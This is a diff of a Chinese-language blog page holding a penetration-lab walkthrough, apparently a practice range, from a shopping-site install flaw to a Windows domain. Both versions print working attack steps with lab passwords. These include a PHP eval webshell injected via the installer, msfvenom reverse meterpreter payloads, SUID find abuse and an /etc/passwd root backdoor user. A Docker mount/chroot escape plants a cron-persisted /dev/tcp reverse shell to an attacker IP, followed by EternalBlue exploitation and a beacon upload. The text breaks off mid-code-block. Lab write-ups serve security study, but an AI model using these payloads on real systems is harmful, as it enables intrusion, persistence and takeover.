-                <a href="#7-%e7%97%95%e8%bf%b9%e6%b8%85%e7%90%86%e5%bb%ba%e8%ae%ae%e6%8e%a8%e8%8d%90" aria-label="7. 痕迹清理建议（推荐）">7. 痕迹清理建议（推荐）</a></li>
+                <a href="#docker-%e9%80%83%e9%80%b8" aria-label="Docker 逃逸">Docker 逃逸</a></li></ul>
+                
             <li>
-                <a href="#%e6%80%bb%e7%bb%93%e4%b8%8e%e6%94%b6%e8%8e%b7" aria-label="总结与收获">总结与收获</a>
+                <a href="#%e5%86%85%e7%bd%91%e6%b8%97%e9%80%8f" aria-label="内网渗透">内网渗透</a><ul>
+                    
+            <li>
+                <a href="#%e5%86%85%e7%bd%91%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86" aria-label="内网信息收集">内网信息收集</a></li>
+            <li>
+                <a href="#win7" aria-label="win7">win7</a></li>
+            <li>
+                <a href="#%e5%9f%9f%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86" aria-label="域信息收集">域信息收集</a></li>
+            <li>
+                <a href="#ad-nopac" aria-label="AD (noPac)">AD (noPac)</a></li>
+            <li>
+                <a href="#%e7%97%95%e8%bf%b9%e6%b8%85%e7%90%86" aria-label="痕迹清理">痕迹清理</a>
             </li>
+        </ul>
+        </li>
         </ul>
     </div>
 </details>
 
-  <div class="post-content md-content"><h3 id="目标环境">目标环境<a hidden class="anchor" aria-hidden="true" href="#目标环境">#</a></h3>
-<table>
-  <thead>
-      <tr>
-          <th>主机名</th>
-          <th>外网 IP</th>
-          <th>内网 IP</th>
-          <th>账号</th>
-          <th>密码</th>
-      </tr>
-  </thead>
-  <tbody>
-      <tr>
-          <td>ubuntu</td>
-          <td>192.168.59.138</td>
-          <td>-</td>
-          <td>ubuntu</td>
-          <td>QWEasd444</td>
-      </tr>
-      <tr>
-          <td>win2003</td>
-          <td>192.168.59.144</td>
-          <td>10.10.10.137</td>
-          <td>administrator</td>
-          <td>admin555</td>
-      </tr>
-      <tr>
-          <td>win7</td>
-          <td>192.168.59.197</td>
-          <td>10.10.10.142</td>
-          <td>win7</td>
-          <td>admin555</td>
-      </tr>
-      <tr>
-          <td>19server-01</td>
-          <td>-</td>
-          <td>10.10.10.140</td>
-          <td>nasa\administrator</td>
-          <td>QWEasd.123</td>
-      </tr>
-      <tr>
-          <td>19server-02</td>
-          <td>-</td>
-          <td>10.10.10.141</td>
-          <td>nasa\administrator</td>
-          <td>QWEasd.123</td>
-      </tr>
-      <tr>
-          <td>域用户</td>
-          <td>-</td>
-          <td>-</td>
-          <td>nasa\test</td>
-          <td>QWEasd!@#999</td>
-      </tr>
-  </tbody>
-</table>
-<h3 id="1-外网打点">1. 外网打点<a hidden class="anchor" aria-hidden="true" href="#1-外网打点">#</a></h3>
-<ul>
-<li>使用 nmap、fscan 进行端口和服务扫描。</li>
-<li>目录扫描发现后台入口 /admin/webadmin.php。</li>
-<li>题目名称含 “nasa”，生成针对性字典成功爆破后台密码 <strong>nasa123</strong>。</li>
-</ul>
-<h3 id="2-获取-webshell代码注入">2. 获取 WebShell（代码注入）<a hidden class="anchor" aria-hidden="true" href="#2-获取-webshell代码注入">#</a></h3>
-<p>目标站点为<strong>逍遥商城系统</strong>，安装向导文件 install/index.php 在未安装（install/install.lock 不存在）时存在严重漏洞。</p>
-<p><strong>利用思路</strong>：</p>
-<ul>
-<li>访问 http://target/install/index.php 进入安装界面。</li>
-<li>在数据库配置环节注入一句话木马：xy_&rsquo;);eval($_POST[&lsquo;cmd&rsquo;])（利用 SQL 拼接构造恶意 config.php）。</li>
-<li>删除 install/install.lock 文件（任意文件删除漏洞或手动操作）。</li>
-<li>蚁剑连接后门：http://192.168.178.140/config.php。</li>
-</ul>
-<p><strong>关键代码片段</strong>（install/index.php）：</p>
-<p>PHP</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-plain" data-lang="plain"><span style="display:flex;"><span>if ($result) {
-</span></span><span style="display:flex;"><span>    // ... 省略
-</span></span><span style="display:flex;"><span>    $config = &#34;&lt;?php\n&#34;
-</span></span><span style="display:flex;"><span>        . &#34;\$pe[&#39;db_host&#39;]   = &#39;{$_p_db_host}&#39;;\n&#34;
-</span></span><span style="display:flex;"><span>        // ...
-</span></span><span style="display:flex;"><span>        . &#34;define(&#39;dbpre&#39;, &#39;{$_p_dbpre}&#39;);\n&#34;
-</span></span><span style="display:flex;"><span>        . &#34;?&gt;&#34;;
-</span></span><span style="display:flex;"><span>    file_put_contents(&#34;{$pe[&#39;path_root&#39;]}config.php&#34;, $config);
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><h3 id="3-linux-提权">3. Linux 提权<a hidden class="anchor" aria-hidden="true" href="#3-linux-提权">#</a></h3>
-<p>上传 LinEnum.sh 进行本地枚举。</p>
-<p><strong>关键发现</strong>：</p>
-<ul>
-<li>当前用户为 www-data。</li>
-<li>主机实际运行在 <strong>Docker 容器</strong> 中（/ .dockerenv）。</li>
-<li>存在 SUID 文件 /usr/bin/find（可利用但受 Docker 限制）。</li>
-<li>MySQL root 密码为空，可直接登录。</li>
-<li>提权受限，最终选择横向移动至 Windows 内网。</li>
-</ul>
-<h3 id="4-内网横向渗透">4. 内网横向渗透<a hidden class="anchor" aria-hidden="true" href="#4-内网横向渗透">#</a></h3>
-<h4 id="41-win719216859197--101010142-eternalblue-ms17-010">4.1 Win7（192.168.59.197 / 10.10.10.142）—— EternalBlue (MS17-010)<a hidden class="anchor" aria-hidden="true" href="#41-win719216859197--101010142-eternalblue-ms17-010">#</a></h4>
-<p>使用 Metasploit exploit/windows/smb/ms17_010_eternalblue 直接打出 <strong>SYSTEM</strong> 权限 Meterpreter：</p>
-<p>Bash</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-plain" data-lang="plain"><span style="display:flex;"><span>msf &gt; use exploit/windows/smb/ms17_010_eternalblue
-</span></span><span style="display:flex;"><span>msf &gt; set RHOSTS 192.168.226.197
-</span></span><span style="display:flex;"><span>msf &gt; exploit
-</span></span></code></pre></div><p>成功后：</p>
-<ul>
-<li>autoroute 添加内网路由 10.10.10.0/24。</li>
-<li>启动 SOCKS5 代理（auxiliary/server/socks_proxy）。</li>
-<li>proxychains4 穿透后续扫描。</li>
-</ul>
-<h4 id="42-win200319216859144--101010137-ms17-010">4.2 Win2003（192.168.59.144 / 10.10.10.137）—— MS17-010<a hidden class="anchor" aria-hidden="true" href="#42-win200319216859144--101010137-ms17-010">#</a></h4>
-<p>使用 auxiliary/admin/smb/ms17_010_command 执行命令：</p>
-<p>Bash</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-plain" data-lang="plain"><span style="display:flex;"><span># 下载木马（VBS 一行命令）
-</span></span><span style="display:flex;"><span>set COMMAND &#34;echo dim xHttp... &gt; dl.vbs &amp;&amp; cscript dl.vbs &amp;&amp; del dl.vbs&#34;
-</span></span><span style="display:flex;"><span>run
+  <div class="post-content md-content"><pre tabindex="0"><code>                   ┌─────────────────┐
+                   │     Ubuntu      │
+                   │ 192.168.226.158 │
+                   └─────────────────┘
+                             │
+               ┌─────────────┼─────────────┐
+               │                           │
+               ▼                           ▼
+   ┌────────────────────┐      ┌────────────────────┐
+   │      win2003       │      │       win7         │
+   │ 192.168.174.136    │      │ 192.168.174.135    │
+   │ 10.10.10.137       │      │ 10.10.10.142       │
+   └────────────────────┘      └────────────────────┘
+                                        │
+                                        ▼
+                 ┌───────────────────────┴───────────────────────┐
+                 │                                               │
+                 ▼                                               ▼
+   ┌─────────────────────────┐                   ┌─────────────────────────┐
+   │     19server-ad01       │                   │     19server-ad02       │
+   │     10.10.10.140        │                   │     10.10.10.139        │
+   └─────────────────────────┘                   └─────────────────────────┘
+</code></pre><h2 id="外网打点">外网打点<a hidden class="anchor" aria-hidden="true" href="#外网打点">#</a></h2>
+<h3 id="目录扫描">目录扫描<a hidden class="anchor" aria-hidden="true" href="#目录扫描">#</a></h3>
+<p><a href="http://192.168.226.161/install/">http://192.168.226.161/admin/</a></p>
+<p><a href="http://192.168.226.161/install/">http://192.168.226.161/install/</a></p>
+<p><font style="color:rgb(0, 0, 0);">./install/install.lock</font></p>
+<h3 id="代码审计">代码审计<a hidden class="anchor" aria-hidden="true" href="#代码审计">#</a></h3>
+<p><a href="https://www.jianshu.com/p/d5a180ebeb7e">https://www.jianshu.com/p/d5a180ebeb7e</a></p>
+<p>nday 发现任意文件删除</p>
+<p>admin/module/db.php 第 168-177 行的 case &lsquo;del&rsquo;: 分支。</p>
+<p>代码注入</p>
+<p><code>../../install/index.php</code></p>
+<h3 id="getshell">GetShell<a hidden class="anchor" aria-hidden="true" href="#getshell">#</a></h3>
+<p><code>xy_');eval($_POST[cmd]);?&gt;//</code></p>
+<p><img loading="lazy" src="https://cdn.nlark.com/yuque/0/2026/png/36155031/1778779982262-5b38d848-9b1d-4a71-8674-92f5bbdc38e1.png"></p>
+<p><a href="http://192.168.226.158/config.php">http://192.168.226.158/config.php</a></p>
+<h2 id="suid提权">SUID提权<a hidden class="anchor" aria-hidden="true" href="#suid提权">#</a></h2>
+<p>当一个程序拥有 SUID 且 owner 是 root 时： 普通用户运行该程序时，程序会 以 root 身份执行</p>
+<p>上传linEnum脚本</p>
+<p><code>touch test</code></p>
+<p><code>find test -exec whoami \;</code></p>
+<h2 id="弹容器-shell">弹容器 Shell<a hidden class="anchor" aria-hidden="true" href="#弹容器-shell">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# msfvenom -p linux/x64/meterpreter/reverse_tcp <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>LHOST<span style="color:#f92672">=</span>192.168.226.128 <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">6666</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>-f elf &gt; moon.elf
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No arch selected, selecting arch: x64 from the payload  
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span># 执行木马
-</span></span><span style="display:flex;"><span>set COMMAND &#34;start /b C:\Windows\Temp\muma0411.exe&#34;
-</span></span><span style="display:flex;"><span>run
-</span></span></code></pre></div><p>成功上线 <strong>SYSTEM</strong> 权限（32位木马）。</p>
-<h3 id="5-域信息收集">5. 域信息收集<a hidden class="anchor" aria-hidden="true" href="#5-域信息收集">#</a></h3>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# msfconsole
+</span></span><span style="display:flex;"><span>Metasploit tip: Start commands with a space to avoid saving them to history
+</span></span><span style="display:flex;"><span>msf &gt; use exploit/multi/handler
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using configured payload generic/shell_reverse_tcp
+</span></span><span style="display:flex;"><span>msf exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; set payload linux/x64/meterpreter/reverse_tcp
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span>&gt; linux/x64/meterpreter/reverse_tcp
+</span></span><span style="display:flex;"><span>msf exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; set LHOST 192.168.226.128
+</span></span><span style="display:flex;"><span>LHOST <span style="color:#f92672">=</span>&gt; 192.168.226.128
+</span></span><span style="display:flex;"><span>msf exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; set LPORT <span style="color:#ae81ff">6666</span>
+</span></span><span style="display:flex;"><span>LPORT <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">6666</span>
+</span></span><span style="display:flex;"><span>msf exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; run
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 监听已开启，等待靶机运行马子即可上线</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on 192.168.226.128:6666 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#f92672">(</span><span style="color:#ae81ff">3090404</span> bytes<span style="color:#f92672">)</span> to 192.168.178.140
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Meterpreter session <span style="color:#ae81ff">1</span> opened <span style="color:#f92672">(</span>192.168.226.128:6666 -&gt; 192.168.178.140:52464<span style="color:#f92672">)</span> at 2026-03-11 13:51:56 -0400
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>meterpreter &gt; getuid
+</span></span><span style="display:flex;"><span>Server username: root
+</span></span><span style="display:flex;"><span>meterpreter &gt; 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>shell 进入靶机终端
+</span></span><span style="display:flex;"><span>想回到 Meterpreter 就直接输入 exit
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>把elf马子传上来
+</span></span><span style="display:flex;"><span>chmod +x moon.elf
+</span></span><span style="display:flex;"><span>touch test
+</span></span><span style="display:flex;"><span>find test -exec ./moon.elf <span style="color:#ae81ff">\;</span>
+</span></span></code></pre></div><h2 id="docker-逃逸">Docker 逃逸<a hidden class="anchor" aria-hidden="true" href="#docker-逃逸">#</a></h2>
+<p><code>ls /.dockerenv</code></p>
+<p><strong>把宿主机的硬盘（文件系统）挂载到容器里的一个目录，然后通过 chroot 把这个目录变成容器的&quot;新根目录&quot;</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# nc -lnvp <span style="color:#ae81ff">8888</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">8888</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>192.168.226.128<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>192.168.226.129<span style="color:#f92672">]</span> <span style="color:#ae81ff">55464</span>
+</span></span><span style="display:flex;"><span>bash: 无法设定终端进程组<span style="color:#f92672">(</span>3231<span style="color:#f92672">)</span>: 对设备不适当的 ioctl 操作
+</span></span><span style="display:flex;"><span>bash: 此 shell 中无任务控制
+</span></span><span style="display:flex;"><span>root@ubuntu-virtual-machine:~# ls
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>meterpreter &gt; shell
+</span></span><span style="display:flex;"><span>Process <span style="color:#ae81ff">107</span> created.
+</span></span><span style="display:flex;"><span>Channel <span style="color:#ae81ff">5</span> created.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>// 添加 root 权限用户，为什么要新增新用户？
+</span></span><span style="display:flex;"><span>openssl passwd -1 -salt pingan pingan0409!!!
+</span></span><span style="display:flex;"><span>$1$pingan$l0v7nyxHDOuitwybLvvZ4.
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;pingan:$1$pingan$l0v7nyxHDOuitwybLvvZ4.:0:0:root:/root:/bin/bash&#39;</span> &gt;&gt; /etc/passwd
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>// 创建交互式shell，切换到新用户pingan
+</span></span><span style="display:flex;"><span>python -c <span style="color:#e6db74">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span><span style="display:flex;"><span>bash-4.3$ su pingan
+</span></span><span style="display:flex;"><span>su pingan
+</span></span><span style="display:flex;"><span>Password: pingan0409!!! 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>// 通过挂载进行 docker 逃逸
+</span></span><span style="display:flex;"><span>// 创建目录
+</span></span><span style="display:flex;"><span>root@683a11bdee30:/app/install# mkdir /pingantest
+</span></span><span style="display:flex;"><span>mkdir /pingantest
+</span></span><span style="display:flex;"><span>// 将宿主的目录挂载到新目录
+</span></span><span style="display:flex;"><span>root@683a11bdee30:/app/install# mount /dev/sda1 /pingantest
+</span></span><span style="display:flex;"><span>mount /dev/sda1 /pingantest
+</span></span><span style="display:flex;"><span>// 改变根目录
+</span></span><span style="display:flex;"><span>root@683a11bdee30:/app/install# chroot /pingantest
+</span></span><span style="display:flex;"><span>chroot /pingantest
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>// 反弹shell
+</span></span><span style="display:flex;"><span>root@683a11bdee30:/# echo <span style="color:#e6db74">&#39;/bin/bash -i &gt;&amp; bash -i &gt;&amp;/dev/tcp/192.168.226.128/8888 0&gt;&amp;1&#39;</span> &gt; /tmp/sec.sh <span style="color:#f92672">&amp;&amp;</span> chmod +x /tmp/sec.sh <span style="color:#f92672">&amp;&amp;</span> cat /tmp/sec.sh <span style="color:#f92672">&amp;&amp;</span> echo <span style="color:#e6db74">&#39;*/1 * * * * root bash /tmp/sec.sh&#39;</span> &gt;&gt;/etc/crontab
+</span></span><span style="display:flex;"><span>&lt; <span style="color:#e6db74">&#39;*/1 * * * * root bash /tmp/sec.sh&#39;</span> &gt;&gt;/etc/crontab
+</span></span><span style="display:flex;"><span>/bin/bash -i &gt;&amp; bash -i &gt;&amp;/dev/tcp/192.168.226.128/8888 0&gt;&amp;<span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>root@683a11bdee30:/# 
+</span></span></code></pre></div><h1 id="内网渗透">内网渗透<a hidden class="anchor" aria-hidden="true" href="#内网渗透">#</a></h1>
+<h2 id="内网信息收集">内网信息收集<a hidden class="anchor" aria-hidden="true" href="#内网信息收集">#</a></h2>
+<p><code>./fscan -h 192.168.226.0/24 -np -no -nopoc</code></p>
+<h2 id="win7">win7<a hidden class="anchor" aria-hidden="true" href="#win7">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# msfconsole
+</span></span><span style="display:flex;"><span>msf &gt; use exploit/windows <span style="color:#75715e"># 只支持 x64</span>
+</span></span><span style="display:flex;"><span>msf exploit<span style="color:#f92672">(</span>windows<span style="color:#f92672">)</span> &gt; set RHOSTS 192.168.226.197
+</span></span><span style="display:flex;"><span>msf exploit<span style="color:#f92672">(</span>windows<span style="color:#f92672">)</span> &gt; set LHOST 192.168.226.128
+</span></span><span style="display:flex;"><span>msf exploit<span style="color:#f92672">(</span>windows<span style="color:#f92672">)</span> &gt; set payload windows/x64/meterpreter/reverse_tcp
+</span></span><span style="display:flex;"><span>msf exploit<span style="color:#f92672">(</span>windows<span style="color:#f92672">)</span> &gt; set VERIFY_ARCH false          
+</span></span><span style="display:flex;"><span>msf exploit<span style="color:#f92672">(</span>windows<span style="color:#f92672">)</span> &gt; set VERIFY_TARGET false
+</span></span><span style="display:flex;"><span>msf exploit<span style="color:#f92672">(</span>windows<span style="color:#f92672">)</span> &gt; set TARGET <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>msf exploit<span style="color:#f92672">(</span>windows<span style="color:#f92672">)</span> &gt; exploit -j
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Exploit running as background job 0.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Exploit completed, but no session was created.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Meterpreter session <span style="color:#ae81ff">1</span> opened <span style="color:#f92672">(</span>192.168.226.128:4444 -&gt; 192.168.226.197:49276<span style="color:#f92672">)</span> at 2026-04-09 11:42:23 -0400
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 192.168.226.197:445 - <span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 192.168.226.197:445 - <span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-WIN-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 192.168.226.197:445 - <span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>sessions
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Active sessions
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  Id  Name  Type                     Information                 Connection
+</span></span><span style="display:flex;"><span>  --  ----  ----                     -----------                 ----------
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">1</span>         meterpreter x64/windows  NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM @ WIN7  192.168.226.128:4444 -&gt; 192.168.226.197:49276 <span style="color:#f92672">(</span>192.168.226.197<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>msf exploit<span style="color:#f92672">(</span>windows<span style="color:#f92672">)</span> &gt; sessions -i <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Starting interaction with 1...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>meterpreter &gt; sysinfo
+</span></span><span style="display:flex;"><span>Computer        : WIN7
+</span></span><span style="display:flex;"><span>OS              : Windows <span style="color:#ae81ff">7</span> <span style="color:#f92672">(</span>6.1 Build 7601, Service Pack 1<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Architecture    : x64
+</span></span><span style="display:flex;"><span>System Language : zh_CN
+</span></span><span style="display:flex;"><span>Domain          : NASA
+</span></span><span style="display:flex;"><span>Logged On Users : <span style="color:#ae81ff">3</span>
+</span></span><span style="display:flex;"><span>Meterpreter     : x64/windows
+</span></span><span style="display:flex;"><span>meterpreter &gt; 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 192.168.226.197 - Meterpreter session <span style="color:#ae81ff">1</span> closed.  Reason: Died
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Win7（192.168.226.197）已经成功拿下 SYSTEM 权限的 Meterpreter 会话！🎉
+</span></span><span style="display:flex;"><span>你现在已经在 NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM 权限下了，这是 Windows 上最高的权限。
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sysinfo                  <span style="color:#75715e"># 查看系统信息</span>
+</span></span><span style="display:flex;"><span>getuid                   <span style="color:#75715e"># 确认权限（应该显示 SYSTEM）</span>
+</span></span><span style="display:flex;"><span>getpid                   <span style="color:#75715e"># 查看当前进程</span>
+</span></span><span style="display:flex;"><span>ipconfig                 <span style="color:#75715e"># 查看靶机网络信息</span>
+</span></span><span style="display:flex;"><span>pwd                      <span style="color:#75715e"># 当前目录</span>
+</span></span><span style="display:flex;"><span>shell                    <span style="color:#75715e"># 进入 cmd 命令行（可选，后面可以 exit 回来）</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sessions -i id
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>后台会话（推荐，先切回 msf 主界面继续操作另一台）：meterpreter background
+</span></span><span style="display:flex;"><span>查看所有会话：msfsessions
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; upload /root/AAA/beacon_x64.exe C:<span style="color:#ae81ff">\\</span>Windows<span style="color:#ae81ff">\\</span>Temp<span style="color:#ae81ff">\\</span>beacon_x64.exe
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Uploading  : /root/beacon_x64.exe -&gt; C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\T</span>emp<span style="color:#ae81ff">\b</span>eacon_x64.exe
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Uploaded 14.00 KiB of 14.00 KiB <span style="color:#f92672">(</span>100.0%<span style="color:#f92672">)</span>: /root/beacon_x64.exe -&gt; C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\T</span>emp<span style="color:#ae81ff">\b</span>eacon_x64.exe
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Completed  : /root/beacon_x64.exe -&gt; C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\T</span>emp<span style="color:#ae81ff">\b</span>eacon_x64.exe
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>beacon_x64.exe
